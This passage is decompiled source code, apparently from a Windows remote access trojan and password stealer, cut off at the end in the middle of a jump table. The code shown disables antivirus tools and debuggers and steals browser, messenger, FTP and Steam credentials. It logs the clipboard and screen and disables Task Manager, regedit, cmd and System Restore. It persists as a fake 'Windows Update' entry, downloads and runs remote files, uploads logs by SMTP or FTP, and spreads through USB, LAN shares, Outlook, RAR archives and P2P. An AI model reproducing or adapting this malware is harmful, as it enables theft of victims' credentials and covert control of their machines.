        this.TextBox4.Text = Form1.RC4(this.TextBox4.Text, this.skey);
        goto label_113;
label_111:
        num3 = 113;
label_112:
        num3 = 114;
        this.Label6.Text = "encrypion-no";
label_113:
        num3 = 116;
        if (!Conversions.ToBoolean(strArray[11]))
          goto label_139;
label_114:
        num3 = 117;
        this.Label8.Text = "anties-Ys";
label_115:
        ProjectData.ClearProjectError();
        num1 = 1;
label_116:
        num3 = 119;
        this.AntiAnubis();
label_117:
        ProjectData.ClearProjectError();
        num1 = 1;
label_118:
        num3 = 121;
        this.AntiBitDefender();
label_119:
        ProjectData.ClearProjectError();
        num1 = 1;
label_120:
        num3 = 123;
        this.AntiKaspersky();
label_121:
        ProjectData.ClearProjectError();
        num1 = 1;
label_122:
        num3 = 125;
        this.AntiKeyscrambler();
label_123:
        ProjectData.ClearProjectError();
        num1 = 1;
label_124:
        num3 = (int) sbyte.MaxValue;
        this.AntiMalwarebytes();
label_125:
        ProjectData.ClearProjectError();
        num1 = 1;
label_126:
        num3 = 129;
        this.AntiNOD32();
label_127:
        ProjectData.ClearProjectError();
        num1 = 1;
label_128:
        num3 = 131;
        this.AntiNorman();
label_129:
        ProjectData.ClearProjectError();
        num1 = 1;
label_130:
        num3 = 133;
        this.AntiOllydbg();
label_131:
        ProjectData.ClearProjectError();
        num1 = 1;
label_132:
        num3 = 135;
        this.AntiOutpost();
label_133:
        ProjectData.ClearProjectError();
        num1 = 1;
label_134:
        num3 = 137;
        this.AntiWireshark();
label_135:
        ProjectData.ClearProjectError();
        num1 = 1;
label_136:
        num3 = 139;
        this.AntiZoneAlarm();
label_137:
        ProjectData.ClearProjectError();
        num1 = 1;
label_138:
        num3 = 141;
        Form1.ant.mofo();
        goto label_141;
label_139:
        num3 = 143;
label_140:
        num3 = 144;
        this.Label8.Text = "anties-no";
label_141:
        num3 = 146;
        if (!Conversions.ToBoolean(strArray[12]))
          goto label_143;
label_142:
        num3 = 147;
        this.Label9.Text = "Rd-Ys";
        goto label_145;
label_143:
        num3 = 149;
label_144:
        num3 = 150;
        this.Label9.Text = "Rd-no";
label_145:
        num3 = 152;
        this.Label10.Text = strArray[13];
label_146:
        num3 = 153;
        this.Label11.Text = strArray[14];
label_147:
        num3 = 154;
        if (!Conversions.ToBoolean(strArray[15]))
          goto label_152;
label_148:
        num3 = 155;
        this.Label12.Text = "Fake-Ys";
label_149:
        num3 = 156;
        this.Label13.Text = strArray[16];
label_150:
        num3 = 157;
        this.Label14.Text = strArray[17];
label_151:
        num3 = 158;
        this.Label15.Text = strArray[18];
        goto label_154;
label_152:
        num3 = 160;
label_153:
        num3 = 161;
        this.Label12.Text = "Fake-no";
label_154:
        num3 = 163;
        if (!Conversions.ToBoolean(strArray[19]))
          goto label_156;
label_155:
        num3 = 164;
        this.Label17.Text = "usb-Ys";
        goto label_158;
label_156:
        num3 = 166;
label_157:
        num3 = 167;
        this.Label17.Text = "usb-no";
label_158:
        num3 = 169;
        if (!Conversions.ToBoolean(strArray[20]))
          goto label_160;
label_159:
        num3 = 170;
        this.Label18.Text = "p2p-Ys";
        goto label_162;
label_160:
        num3 = 172;
label_161:
        num3 = 173;
        this.Label18.Text = "p2p-no";
label_162:
        num3 = 175;
        if (!Conversions.ToBoolean(strArray[21]))
          goto label_164;
label_163:
        num3 = 176;
        this.Label19.Text = "screenlogger-Ys";
        goto label_166;
label_164:
        num3 = 178;
label_165:
        num3 = 179;
        this.Label19.Text = "screenlogger-no";
label_166:
        num3 = 181;
        if (!Conversions.ToBoolean(strArray[22]))
          goto label_201;
label_167:
        num3 = 182;
        this.Label20.Text = "stealers-Ys";
label_168:
        ProjectData.ClearProjectError();
        num1 = 1;
label_169:
        num3 = 184;
        Module1.Main();
label_170:
        ProjectData.ClearProjectError();
        num1 = 1;
label_171:
        num3 = 186;
        this.GetChrome();
label_172:
        ProjectData.ClearProjectError();
        num1 = 1;
label_173:
        num3 = 188;
        this.paltalkscene();
label_174:
        ProjectData.ClearProjectError();
        num1 = 1;
label_175:
        num3 = 190;
        this.Imvu_Fuck();
label_176:
        ProjectData.ClearProjectError();
        num1 = 1;
label_177:
        num3 = 192;
        this.NoIPRec();
label_178:
        ProjectData.ClearProjectError();
        num1 = 1;
label_179:
        num3 = 194;
        this.dyn1();
label_180:
        ProjectData.ClearProjectError();
        num1 = 1;
label_181:
        num3 = 196;
        this.pigdin();
label_182:
        ProjectData.ClearProjectError();
        num1 = 1;
label_183:
        num3 = 198;
        this.fzilla();
label_184:
        ProjectData.ClearProjectError();
        num1 = 1;
label_185:
        num3 = 200;
        this.SmartFTP();
label_186:
        ProjectData.ClearProjectError();
        num1 = 1;
label_187:
        num3 = 202;
        this.CoreFTP();
label_188:
        ProjectData.ClearProjectError();
        num1 = 1;
label_189:
        num3 = 204;
        this.TextBox9.Text = FuckTheKey.fuckkeys();
label_190:
        ProjectData.ClearProjectError();
        num1 = 1;
label_191:
        num3 = 206;
        this.FuckIe();
label_192:
        num3 = 207;
        this.TextBox10.Text = this.ie;
label_193:
        ProjectData.ClearProjectError();
        num1 = 1;
label_194:
        num3 = 209;
        this.msn_fuck_x();
label_195:
        ProjectData.ClearProjectError();
        num1 = 1;
label_196:
        num3 = 211;
        this.Idm_Fuck_x();
label_197:
        ProjectData.ClearProjectError();
        num1 = 1;
label_198:
        num3 = 213;
        this.steam_fuck();
label_199:
        num3 = 214;
        this.steam();
label_200:
        num3 = 215;
        this.forcesteam();
        goto label_203;
label_201:
        num3 = 217;
label_202:
        num3 = 218;
        this.Label20.Text = "stealers-no";
label_203:
        num3 = 220;
        if (!Conversions.ToBoolean(strArray[23]))
          goto label_205;
label_204:
        num3 = 221;
        this.Label29.Text = "av_blocker-Ys";
        goto label_207;
label_205:
        num3 = 223;
label_206:
        num3 = 224;
        this.Label29.Text = "av_blocker-no";
label_207:
        num3 = 226;
        if (!Conversions.ToBoolean(strArray[24]))
          goto label_210;
label_208:
        num3 = 227;
        this.Label30.Text = "clipboardlogger-Ys";
label_209:
        num3 = 228;
        this.Timer2.Start();
        goto label_212;
label_210:
        num3 = 230;
label_211:
        num3 = 231;
        this.Label30.Text = "clipboardlogger-no";
label_212:
        num3 = 233;
        if (!Conversions.ToBoolean(strArray[25]))
          goto label_220;
label_213:
        num3 = 234;
        this.Label31.Text = "delete coockies-Ys";
label_214:
        ProjectData.ClearProjectError();
        num1 = 1;
label_215:
        num3 = 236;
        this.KillProcesses(true, true);
label_216:
        ProjectData.ClearProjectError();
        num1 = 1;
label_217:
        num3 = 238;
        this.DeleteIECookies(true);
label_218:
        ProjectData.ClearProjectError();
        num1 = 1;
label_219:
        num3 = 240;
        this.DeleteMozillaCookies(true);
        goto label_222;
label_220:
        num3 = 242;
label_221:
        num3 = 243;
        this.Label31.Text = "delete coockies-no";
label_222:
        num3 = 245;
        if (!Conversions.ToBoolean(strArray[26]))
          goto label_226;
label_223:
        num3 = 246;
        this.Label22.Text = "fuck run-Ys";
label_224:
        ProjectData.ClearProjectError();
        num1 = 1;
label_225:
        num3 = 248;
        Interaction.Shell("REG add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoRun /t REG_DWORD /d 1 /f", AppWinStyle.Hide);
        goto label_228;
label_226:
        num3 = 250;
label_227:
        num3 = 251;
        this.Label22.Text = "fuck run-no";
label_228:
        num3 = 253;
        if (!Conversions.ToBoolean(strArray[27]))
          goto label_230;
label_229:
        num3 = 254;
        this.Label23.Text = "fuck taskbar-Ys";
        goto label_232;
label_230:
        num3 = 256;
label_231:
        num3 = 257;
        this.Label23.Text = "fuck taskbar-no";
label_232:
        num3 = 259;
        if (!Conversions.ToBoolean(strArray[28]))
          goto label_236;
label_233:
        num3 = 260;
        this.Label24.Text = "fuck cmd-Ys";
label_234:
        ProjectData.ClearProjectError();
        num1 = 1;
label_235:
        num3 = 262;
        Interaction.Shell("REG add HKCU\\Software\\Policies\\Microsoft\\Windows\\System /v DisableCMD /t REG_DWORD /d 1 /f", AppWinStyle.Hide);
        goto label_238;
label_236:
        num3 = 264;
label_237:
        num3 = 265;
        this.Label24.Text = "fuck cmd-no";
label_238:
        num3 = 267;
        if (!Conversions.ToBoolean(strArray[29]))
          goto label_242;
label_239:
        num3 = 268;
        this.Label25.Text = "fuck reg-Ys";
label_240:
        ProjectData.ClearProjectError();
        num1 = 1;
label_241:
        num3 = 270;
        Interaction.Shell("REG add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableRegistryTools /t REG_DWORD /d 1 /f", AppWinStyle.Hide);
        goto label_244;
label_242:
        num3 = 272;
label_243:
        num3 = 273;
        this.Label25.Text = "fuck reg-no";
label_244:
        num3 = 275;
        if (!Conversions.ToBoolean(strArray[30]))
          goto label_248;
label_245:
        num3 = 276;
        this.Label26.Text = "fuck rightclick-Ys";
label_246:
        ProjectData.ClearProjectError();
        num1 = 1;
label_247:
        num3 = 278;
        Interaction.Shell("REG add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoViewContextMenu /t REG_DWORD /d 1 /f", AppWinStyle.Hide);
        goto label_250;
label_248:
        num3 = 280;
label_249:
        num3 = 281;
        this.Label26.Text = "fuck rightclick-no";
label_250:
        num3 = 283;
        if (!Conversions.ToBoolean(strArray[31]))
          goto label_254;
label_251:
        num3 = 284;
        this.Label27.Text = "fuck fInfo-Ys";
label_252:
        ProjectData.ClearProjectError();
        num1 = 1;
label_253:
        num3 = 286;
        Interaction.Shell("REG add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoFolderInfo /t REG_DWORD /d 1 /f", AppWinStyle.Hide);
        goto label_256;
label_254:
        num3 = 288;
label_255:
        num3 = 289;
        this.Label27.Text = "fuck fInfo-no";
label_256:
        num3 = 291;
        if (!Conversions.ToBoolean(strArray[32]))
          goto label_260;
label_257:
        num3 = 292;
        this.Label28.Text = "fuck taskmngr-Ys";
label_258:
        ProjectData.ClearProjectError();
        num1 = 1;
label_259:
        num3 = 294;
        Interaction.Shell("REG add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f", AppWinStyle.Hide);
        goto label_262;
label_260:
        num3 = 296;
label_261:
        num3 = 297;
        this.Label28.Text = "fuck taskmngr-no";
label_262:
        num3 = 299;
        if (!Conversions.ToBoolean(strArray[33]))
          goto label_266;
label_263:
        num3 = 300;
        this.Label32.Text = "fuck cpanel-Ys";
label_264:
        ProjectData.ClearProjectError();
        num1 = 1;
label_265:
        num3 = 302;
        Interaction.Shell("REG add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoControlPanel /t REG_DWORD /d 1 /f", AppWinStyle.Hide);
        goto label_268;
label_266:
        num3 = 304;
label_267:
        num3 = 305;
        this.Label32.Text = "fuck cpanel-no";
label_268:
        num3 = 307;
        if (!Conversions.ToBoolean(strArray[34]))
          goto label_272;
label_269:
        num3 = 308;
        this.Label33.Text = "fuck sysrestore-Ys";
label_270:
        ProjectData.ClearProjectError();
        num1 = 1;
label_271:
        num3 = 310;
        MyProject.Computer.Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore", "DisableSR", (object) "1", RegistryValueKind.DWord);
        goto label_274;
label_272:
        num3 = 312;
label_273:
        num3 = 313;
        this.Label33.Text = "fuck sysrestore-no";
label_274:
        num3 = 315;
        this.sername = strArray[35];
label_275:
        num3 = 316;
        this.Label34.Text = this.sername;
label_276:
        num3 = 317;
        if (!Conversions.ToBoolean(strArray[36]))
          goto label_284;
label_277:
        num3 = 318;
        this.Label16.Text = "startup-Ys";
label_278:
        ProjectData.ClearProjectError();
        num1 = 1;
label_279:
        num3 = 320;
        string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Templates);
label_280:
        num3 = 321;
        if (!System.IO.File.Exists(folderPath + "\\" + this.Label34.Text + ".exe"))
          goto label_282;
label_281:
        num3 = 322;
        MyProject.Computer.FileSystem.DeleteFile(folderPath + "\\" + this.Label34.Text + ".exe");
label_282:
        num3 = 324;
        System.IO.File.Copy(Application.ExecutablePath, folderPath + "\\" + this.Label34.Text + ".exe");
label_283:
        num3 = 325;
        MyProject.Computer.Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "Windows Update", (object) (folderPath + "\\" + this.Label34.Text + ".exe"), RegistryValueKind.String);
        goto label_286;
label_284:
        num3 = 327;
label_285:
        num3 = 328;
        this.Label16.Text = "startup-no";
label_286:
        num3 = 330;
        this.TextBox6.Text = strArray[37];
label_287:
        num3 = 331;
        if (Operators.CompareString(this.Label29.Text, "av_blocker-Ys", false) != 0)
          goto label_295;
label_288:
        ProjectData.ClearProjectError();
        num1 = 1;
label_289:
        num3 = 333;
        string path = this.dpath + "\\drivers\\etc\\\\hosts";
label_290:
        num3 = 334;
        StreamWriter streamWriter = new StreamWriter(path);
label_291:
        num3 = 335;
        streamWriter.Write("# + -----Created By Rapid (Indian - Coder ) --------- +");
label_292:
        num3 = 336;
        streamWriter.Write(Environment.NewLine);
label_293:
        num3 = 337;
        streamWriter.Write(this.TextBox6.Text);
label_294:
        num3 = 338;
        streamWriter.Dispose();
label_295:
        num3 = 340;
        if (Operators.CompareString(this.Label17.Text, "usb-Ys", false) != 0)
          ;
label_296:
        num3 = 342;
        this.totalfuckshit = "[Stealers] " + this.nl + this.nl + "FireFox Passwords" + this.nl + this.nl + this.TextBox7.Text + this.nl + this.nl + "Internet Explorer Passwords" + this.nl + this.ie + this.nl + this.nl + "Google Chrome Passwords" + this.nl + this.TextBox8.Text + this.nl + this.nl + "Msn Messenger Passwords" + this.nl + this.msn1 + this.nl + this.msn2 + this.nl + this.nl + "[--------- Paltalk Scene  ----------]" + this.nl + this.@out + this.nl + this.nl + " [--------- Pidgin ----------]  " + this.nl + this.Pigtext + this.nl + this.nl + "" + this.nl + this.NoIpBox + this.nl + this.nl + "" + this.nl + this.imvu + this.nl + this.nl + "FileZilla" + this.nl + this.filez + this.nl + this.nl + "DynDn" + this.nl + this.dynfuck + this.nl + this.nl + "SmartFTP" + this.nl + this.SmartFTP() + this.nl + this.nl + "Core FTP" + this.nl + this.CoreFTP() + this.nl + this.nl + "Internet Download Manager" + this.nl + this.nl + this.idmpass + this.nl + this.nl;
label_297:
        num3 = 343;
        this.TextBox12.Text = this.totalfuckshit;
label_298:
        num3 = 344;
        this.Timer1.Start();
label_299:
        num3 = 345;
        this.cd_keytxt_Create();
label_300:
        num3 = 346;
        if (Operators.CompareString(this.Label2.Text, "smtp", false) != 0)
          goto label_307;
label_301:
        ProjectData.ClearProjectError();
        num1 = 1;
label_302:
        num3 = 348;
        this.cp_information();
label_303:
        num3 = 349;
        this.Timer3.Interval = checked ((int) Math.Round(unchecked (Conversions.ToDouble(this.Label1.Text) * 60000.0)));
label_304:
        num3 = 350;
        this.Label1.Text = Conversions.ToString(this.Timer3.Interval);
label_305:
        num3 = 351;
        this.Timer3.Start();
label_306:
        num3 = 352;
        this.Label41.Text = "Timer 3 --------- Smtp started";
label_307:
        num3 = 354;
        if (Operators.CompareString(this.Label2.Text, "ftp", false) != 0)
          goto label_315;
label_308:
        ProjectData.ClearProjectError();
        num1 = 1;
label_309:
        num3 = 356;
        this.cp_information();
label_310:
        num3 = 357;
        this.makedir();
label_311:
        num3 = 358;
        this.Timer5.Interval = checked ((int) Math.Round(unchecked (Conversions.ToDouble(this.Label1.Text) * 60000.0)));
label_312:
        num3 = 359;
        this.Label1.Text = Conversions.ToString(this.Timer5.Interval);
label_313:
        num3 = 360;
        this.Timer5.Start();
label_314:
        num3 = 361;
        this.Label41.Text = "Timer 5 : Ftp started";
label_315:
        num3 = 363;
        if (!Conversions.ToBoolean(strArray[38]))
          goto label_326;
label_316:
        num3 = 364;
        this.Label42.Text = "Logsfucker-Ys";
label_317:
        num3 = 365;
        this.TextBox18.Text = strArray[39];
label_318:
        num3 = 366;
        WebClient webClient = new WebClient();
label_319:
        num3 = 367;
        string str = webClient.DownloadString(this.TextBox18.Text).Trim();
label_320:
        num3 = 368;
        this.TextBox19.Text = str;
label_321:
        num3 = 369;
        if (Operators.CompareString(this.TextBox20.Text, this.TextBox19.Text, false) != 0)
          goto label_328;
label_322:
        num3 = 370;
        this.Timer1.Stop();
label_323:
        num3 = 371;
        this.Timer3.Stop();
label_324:
        num3 = 372;
        this.Timer5.Stop();
label_325:
        num3 = 373;
        this.TextBox1.Text = "";
        goto label_328;
label_326:
        num3 = 376;
label_327:
        num3 = 377;
        this.Label42.Text = "logsfucker-no";
label_328:
        num3 = 379;
        if (Operators.CompareString(this.Label9.Text, "Rd-Ys", false) != 0)
          goto label_333;
label_329:
        num3 = 380;
        if (!System.IO.File.Exists(this.dpath + "\\" + this.Label11.Text))
          goto label_331;
label_330:
        num3 = 381;
        System.IO.File.Delete(this.dpath + "\\" + this.Label11.Text);
label_331:
        num3 = 383;
        MyProject.Computer.Network.DownloadFile(this.Label10.Text, this.dpath + "\\" + this.Label11.Text);
label_332:
        num3 = 384;
        Process.Start(this.dpath + "\\" + this.Label11.Text);
label_333:
        num3 = 386;
        if (Operators.CompareString(this.Label12.Text, "Fake-Ys", false) != 0)
          goto label_343;
label_334:
        ProjectData.ClearProjectError();
        num1 = 1;
label_335:
        num3 = 388;
        if (Operators.CompareString(this.Label15.Text, "error", false) != 0)
          goto label_337;
label_336:
        num3 = 389;
        MessageBox.Show(this.Label14.Text, this.Label13.Text, MessageBoxButtons.AbortRetryIgnore, MessageBoxIcon.Hand);
        goto label_343;
label_337:
        num3 = 391;
        if (Operators.CompareString(this.Label15.Text, "asterisk", false) != 0)
          goto label_339;
label_338:
        num3 = 392;
        MessageBox.Show(this.Label14.Text, this.Label13.Text, MessageBoxButtons.AbortRetryIgnore, MessageBoxIcon.Asterisk);
        goto label_343;
label_339:
        num3 = 394;
        if (Operators.CompareString(this.Label15.Text, "warning", false) != 0)
          goto label_341;
label_340:
        num3 = 395;
        MessageBox.Show(this.Label14.Text, this.Label13.Text, MessageBoxButtons.AbortRetryIgnore, MessageBoxIcon.Exclamation);
        goto label_343;
label_341:
        num3 = 397;
        if (Operators.CompareString(this.Label15.Text, "question", false) != 0)
          goto label_343;
label_342:
        num3 = 398;
        MessageBox.Show(this.Label14.Text, this.Label13.Text, MessageBoxButtons.AbortRetryIgnore, MessageBoxIcon.Question);
label_343:
        num3 = 401;
        if (!Conversions.ToBoolean(strArray[40]))
          goto label_347;
label_344:
        ProjectData.ClearProjectError();
        num1 = 1;
label_345:
        num3 = 403;
        this.StartDetection();
label_346:
        num3 = 404;
        this.Label43.Text = "usb yes";
        goto label_349;
label_347:
        num3 = 406;
label_348:
        num3 = 407;
        this.Label43.Text = "usb no";
label_349:
        num3 = 409;
        if (!Conversions.ToBoolean(strArray[41]))
          goto label_353;
label_350:
        ProjectData.ClearProjectError();
        num1 = 1;
label_351:
        num3 = 411;
        yahoo.yahoo_sp();
label_352:
        num3 = 412;
        this.Label44.Text = "yahoo yes";
        goto label_355;
label_353:
        num3 = 414;
label_354:
        num3 = 415;
        this.Label44.Text = "yahoo no ";
label_355:
        num3 = 417;
        if (!Conversions.ToBoolean(strArray[42]))
          goto label_361;
label_356:
        ProjectData.ClearProjectError();
        num1 = 1;
label_357:
        num3 = 419;
        LAN.UniversalUser();
label_358:
        num3 = 420;
        LAN.CreateShare("C:\\Program Settings", "Program Settings");
label_359:
        num3 = 421;
        LAN.Share();
label_360:
        num3 = 422;
        this.Label45.Text = "Lan yes";
        goto label_363;
label_361:
        num3 = 424;
label_362:
        num3 = 425;
        this.Label45.Text = "lan no ";
label_363:
        num3 = 427;
        if (!Conversions.ToBoolean(strArray[43]))
          goto label_367;
label_364:
        ProjectData.ClearProjectError();
        num1 = 1;
label_365:
        num3 = 429;
        Outlook.Send();
label_366:
        num3 = 430;
        this.Label46.Text = "Olook yes";
        goto label_369;
label_367:
        num3 = 432;
label_368:
        num3 = 433;
        this.Label46.Text = "Olook no ";
label_369:
        num3 = 435;
        if (!Conversions.ToBoolean(strArray[44]))
          goto label_373;
label_370:
        ProjectData.ClearProjectError();
        num1 = 1;
label_371:
        num3 = 437;
        RAR.Spread("winlogn.exe");
label_372:
        num3 = 438;
        this.Label47.Text = "rar yes";
        goto label_375;
label_373:
        num3 = 440;
label_374:
        num3 = 441;
        this.Label47.Text = "rar no ";
label_375:
        num3 = 443;
        if (!Conversions.ToBoolean(strArray[45]))
          goto label_379;
label_376:
        ProjectData.ClearProjectError();
        num1 = 1;
label_377:
        num3 = 445;
        P2P.p2p();
label_378:
        num3 = 446;
        this.Label48.Text = "p2p yes";
        goto label_387;
label_379:
        num3 = 448;
label_380:
        num3 = 449;
        this.Label48.Text = "p2p no ";
        goto label_387;
label_382:
        num2 = num3;
        switch (num1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_2;
              case 4:
                goto label_3;
              case 5:
                goto label_4;
              case 6:
                goto label_5;
              case 7:
                goto label_6;
              case 8:
                goto label_7;
              case 9:
                goto label_8;
              case 10:
                goto label_9;
              case 11:
                goto label_10;
              case 12:
                goto label_11;
              case 13:
                goto label_12;
              case 14:
                goto label_13;
              case 15:
                goto label_14;
              case 16:
                goto label_15;
              case 17:
                goto label_16;
              case 18:
                goto label_17;
              case 19:
                goto label_18;
              case 20:
                goto label_19;
              case 21:
                goto label_20;
              case 22:
                goto label_21;
              case 23:
                goto label_22;
              case 24:
                goto label_23;
              case 25:
                goto label_24;
              case 26:
                goto label_25;
              case 27:
                goto label_26;
              case 28:
                goto label_27;
              case 29:
                goto label_28;
              case 30:
                goto label_29;
              case 31:
                goto label_30;
              case 32:
                goto label_31;
              case 33:
                goto label_32;
              case 34:
                goto label_33;
              case 35:
                goto label_34;
              case 36:
                goto label_35;
              case 37:
                goto label_36;
              case 38:
                goto label_37;
              case 39:
                goto label_38;
              case 40:
                goto label_39;
              case 41:
                goto label_40;
              case 42:
                goto label_41;
              case 43:
                goto label_42;
              case 44:
                goto label_43;
              case 45:
                goto label_44;
              case 46:
                goto label_45;
              case 47:
                goto label_46;
              case 48:
                goto label_47;
              case 49:
                goto label_48;
              case 50:
                goto label_49;
              case 51:
                goto label_50;
              case 52:
                goto label_51;
              case 53:
                goto label_52;
              case 54:
                goto label_53;
              case 55:
                goto label_54;
              case 56:
                goto label_55;
              case 57:
                goto label_56;
              case 58:
                goto label_57;
              case 59:
                goto label_58;
              case 60:
                goto label_59;
              case 61:
                goto label_60;
              case 62:
                goto label_61;
              case 63:
                goto label_62;
              case 64:
                goto label_63;
              case 65:
                goto label_64;
              case 66:
                goto label_65;
              case 67:
                goto label_66;
              case 68:
                goto label_67;
              case 69:
                goto label_68;
              case 70:
                goto label_69;
              case 71:
                goto label_70;
              case 72:
                goto label_71;
              case 73:
                goto label_72;
              case 74:
                goto label_73;
              case 75:
                goto label_74;
              case 76:
                goto label_75;
              case 77:
                goto label_76;
              case 78:
                goto label_77;
              case 79:
                goto label_78;
              case 80:
                goto label_79;
              case 81:
                goto label_80;
              case 82:
                goto label_81;
              case 83:
                goto label_82;
              case 84:
                goto label_83;
              case 85:
                goto label_84;
              case 86:
                goto label_85;
              case 87:
                goto label_86;
              case 88:
                goto label_87;
              case 89:
                goto label_88;
              case 90:
                goto label_89;
              case 91:
                goto label_90;
              case 92:
                goto label_91;
              case 93:
                goto label_92;
              case 94:
                goto label_93;
              case 95:
                goto label_94;
              case 96:
                goto label_95;
              case 97:
                goto label_96;
              case 98:
                goto label_97;
              case 99:
                goto label_98;
              case 100:
                goto label_99;
              case 101:
                goto label_100;
              case 102:
                goto label_101;
              case 103:
                goto label_102;
              case 104:
                goto label_103;
              case 105:
                goto label_104;
              case 106:
                goto label_105;
              case 107:
                goto label_106;
              case 108:
                goto label_107;
              case 109:
                goto label_108;
              case 110:
                goto label_109;
              case 111:
                goto label_110;
              case 112:
              case 115:
              case 116:
                goto label_113;
              case 113:
                goto label_111;
              case 114:
                goto label_112;
              case 117:
                goto label_114;
              case 118:
                goto label_115;
              case 119:
                goto label_116;
              case 120:
                goto label_117;
              case 121:
                goto label_118;
              case 122:
                goto label_119;
              case 123:
                goto label_120;
              case 124:
                goto label_121;
              case 125:
                goto label_122;
              case 126:
                goto label_123;
              case (int) sbyte.MaxValue:
                goto label_124;
              case 128:
                goto label_125;
              case 129:
                goto label_126;
              case 130:
                goto label_127;
              case 131:
                goto label_128;
              case 132:
                goto label_129;
              case 133:
                goto label_130;
              case 134:
                goto label_131;
              case 135:
                goto label_132;
              case 136:
                goto label_133;
              case 137:
                goto label_134;
              case 138:
                goto label_135;
              case 139:
                goto label_136;
              case 140:
                goto label_137;
              case 141:
                goto label_138;
              case 142:
              case 145:
              case 146:
                goto label_141;
              case 143:
                goto label_139;
              case 144:
                goto label_140;
              case 147:
                goto label_142;
              case 148:
              case 151:
              case 152:
                goto label_145;
              case 149:
                goto label_143;
              case 150:
                goto label_144;
              case 153:
                goto label_146;
              case 154:
                goto label_147;
              case 155:
                goto label_148;
              case 156:
                goto label_149;
              case 157:
                goto label_150;
              case 158:
                goto label_151;
              case 159:
              case 162:
              case 163:
                goto label_154;
              case 160:
                goto label_152;
              case 161:
                goto label_153;
              case 164:
                goto label_155;
              case 165:
              case 168:
              case 169:
                goto label_158;
              case 166:
                goto label_156;
              case 167:
                goto label_157;
              case 170:
                goto label_159;
              case 171:
              case 174:
              case 175:
                goto label_162;
              case 172:
                goto label_160;
              case 173:
                goto label_161;
              case 176:
                goto label_163;
              case 177:
              case 180:
              case 181:
                goto label_166;
              case 178:
                goto label_164;
              case 179:
                goto label_165;
              case 182:
                goto label_167;
              case 183:
                goto label_168;
              case 184:
                goto label_169;
              case 185:
                goto label_170;
              case 186:
                goto label_171;
              case 187:
                goto label_172;
              case 188:
                goto label_173;
              case 189:
                goto label_174;
              case 190:
                goto label_175;
              case 191:
                goto label_176;
              case 192:
                goto label_177;
              case 193:
                goto label_178;
              case 194:
                goto label_179;
              case 195:
                goto label_180;
              case 196:
                goto label_181;
              case 197:
                goto label_182;
              case 198:
                goto label_183;
              case 199:
                goto label_184;
              case 200:
                goto label_185;
              case 201:
                goto label_186;
              case 202:
                goto label_187;
              case 203:
                goto label_188;
              case 204:
                goto label_189;
              case 205:
                goto label_190;
              case 206:
                goto label_191;
              case 207:
                goto label_192;
              case 208:
                goto label_193;
              case 209:
                goto label_194;
              case 210:
                goto label_195;
              case 211:
                goto label_196;
              case 212:
                goto label_197;
              case 213:
                goto label_198;
              case 214:
                goto label_199;
              case 215:
                goto label_200;
              case 216:
              case 219:
              case 220:
                goto label_203;
              case 217:
                goto label_201;
              case 218:
                goto label_202;
              case 221:
                goto label_204;
              case 222:
              case 225:
              case 226:
                goto label_207;
              case 223:
                goto label_205;
              case 224:
                goto label_206;
              case 227:
                goto label_208;
              case 228:
                goto label_209;
              case 229:
              case 232:
              case 233:
                goto label_212;
              case 230:
                goto label_210;
              case 231:
                goto label_211;
              case 234:
                goto label_213;
              case 235:
                goto label_214;
              case 236:
                goto label_215;
              case 237:
                goto label_216;
              case 238:
                goto label_217;
              case 239:
                goto label_218;
              case 240:
                goto label_219;
              case 241:
              case 244:
              case 245:
                goto label_222;
              case 242:
                goto label_220;
              case 243:
                goto label_221;
              case 246:
                goto label_223;
              case 247:
                goto label_224;
              case 248:
                goto label_225;
              case 249:
              case 252:
              case 253:
                goto label_228;
              case 250:
                goto label_226;
              case 251:
                goto label_227;
              case 254:
                goto label_229;
              case (int) byte.MaxValue:
              case 258:
              case 259:
                goto label_232;
              case 256:
                goto label_230;
              case 257:
                goto label_231;
              case 260:
                goto label_233;
              case 261:
                goto label_234;
              case 262:
                goto label_235;
              case 263:
              case 266:
              case 267:
                goto label_238;
              case 264:
                goto label_236;
              case 265:
                goto label_237;
              case 268:
                goto label_239;
              case 269:
                goto label_240;
              case 270:
                goto label_241;
              case 271:
              case 274:
              case 275:
                goto label_244;
              case 272:
                goto label_242;
              case 273:
                goto label_243;
              case 276:
                goto label_245;
              case 277:
                goto label_246;
              case 278:
                goto label_247;
              case 279:
              case 282:
              case 283:
                goto label_250;
              case 280:
                goto label_248;
              case 281:
                goto label_249;
              case 284:
                goto label_251;
              case 285:
                goto label_252;
              case 286:
                goto label_253;
              case 287:
              case 290:
              case 291:
                goto label_256;
              case 288:
                goto label_254;
              case 289:
                goto label_255;
              case 292:
                goto label_257;
              case 293:
                goto label_258;
              case 294:
                goto label_259;
              case 295:
              case 298:
              case 299:
                goto label_262;
              case 296:
                goto label_260;
              case 297:
                goto label_261;
              case 300:
                goto label_263;
              case 301:
                goto label_264;
              case 302:
                goto label_265;
              case 303:
              case 306:
              case 307:
                goto label_268;
              case 304:
                goto label_266;
              case 305:
                goto label_267;
              case 308:
                goto label_269;
              case 309:
                goto label_270;
              case 310:
                goto label_271;
              case 311:
              case 314:
              case 315:
                goto label_274;
              case 312:
                goto label_272;
              case 313:
                goto label_273;
              case 316:
                goto label_275;
              case 317:
                goto label_276;
              case 318:
                goto label_277;
              case 319:
                goto label_278;
              case 320:
                goto label_279;
              case 321:
                goto label_280;
              case 322:
                goto label_281;
              case 323:
              case 324:
                goto label_282;
              case 325:
                goto label_283;
              case 326:
              case 329:
              case 330:
                goto label_286;
              case 327:
                goto label_284;
              case 328:
                goto label_285;
              case 331:
                goto label_287;
              case 332:
                goto label_288;
              case 333:
                goto label_289;
              case 334:
                goto label_290;
              case 335:
                goto label_291;
              case 336:
                goto label_292;
              case 337:
                goto label_293;
              case 338:
                goto label_294;
